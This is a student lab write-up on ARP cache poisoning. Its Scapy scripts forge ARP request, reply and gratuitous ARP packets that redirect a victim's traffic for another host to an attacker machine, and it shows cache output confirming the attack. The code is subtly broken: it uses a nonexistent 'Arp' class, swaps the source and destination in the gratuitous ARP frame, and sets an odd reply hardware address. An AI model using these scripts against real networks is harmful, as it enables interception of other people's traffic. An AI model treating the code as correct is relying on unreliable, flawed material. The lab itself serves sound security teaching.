# AITM AND ARP CACHE POISONING

## 1. ARP CACHE POISONING

The objective of the first part is to gain some familiarity with ARP spoofing.  
The setup includes three machines in the same local network, two are victims (**A**, **B**) while one is the attacker (`M`).

These machines have the following information:

| Machine | IP address | MAC address |
| ------- | ---------- | ----------- |
| M       | 10.9.0.105 | 02:42:0a:09:00:69 | 
| A       | 10.9.0.5   | 02:42:0a:09:00:05 |
| B       | 10.9.0.6   | 02:42:0a:09:00:06 |


and will be identified using `MAC_A` or `IP_M` from now on.

### 1.1. ARP Request

The task was to construct an ARP request on host `M` to map `B`'s IP address to `M`'s MAC address.  
To perform such operation the following python script was used:
```python
from scapy.all import *

E = Ether(src=MAC_M, dst=MAC_A)
A = Arp(psrc=IP_B, pdst=IP_A, hwsrc=MAC_M)
A.op = 1

pkt = E/A
sendp(pkt)
```

this successfully manages to poison the APR cache of `A` as results from:

```
$ arp -n
Address     HWtype  HWaddress           Flags Mask  Iface
10.9.0.6    ether   02:42:0a:09:00:69   C           eth0
```

### 1.2. ARP Reply

The task was to construct an ARP reply on host `M` to map `B`' IP address to `M`'s MAC address. The attack is tested against two scenarios:
+ `B` is already in `A`'s cache.
+ `B` isn't

The script used is:
```python
from scapy.all import *

E = Ether(src=MAC_M, dst=MAC_A)
A = Arp(psrc=IP_B, pdst=IP_A, hwdst=MAC_M, hwsrc=MAC_M)
A.op = 2

pkt = E/A
sendp(pkt)
```

Now in the two scenarios the content of `A`'s ARP cache will be different:
+ If `B` is already in `A`'s cache then the operations succeeds
+ otherwise it fails and the cache is empty

In the first scenario the cache has the same content as in the previous task.

### 1.3. Gratuitous ARP

The task consists in constructing a gratuitous ARP  and use it to map `B`'s IP address to `M`'s MAC address. Also in this case we consider the two scenarios.

The code to perform the attack is as follows:
```python
from scapy.all import *

E = Ether(src=MAC_BCAST, dst=MAC_M)
A = Arp(psrc=IP_B, pdst=IP_B, hwsrc=MAC_M, hwdst=MAC_BCAST)
A.op = 1

pkt = E/A
sendp(pkt)
```

~~also in this case the content of the cache is filled only if the ARP cache of `A` already contains an entry for `B`.~~



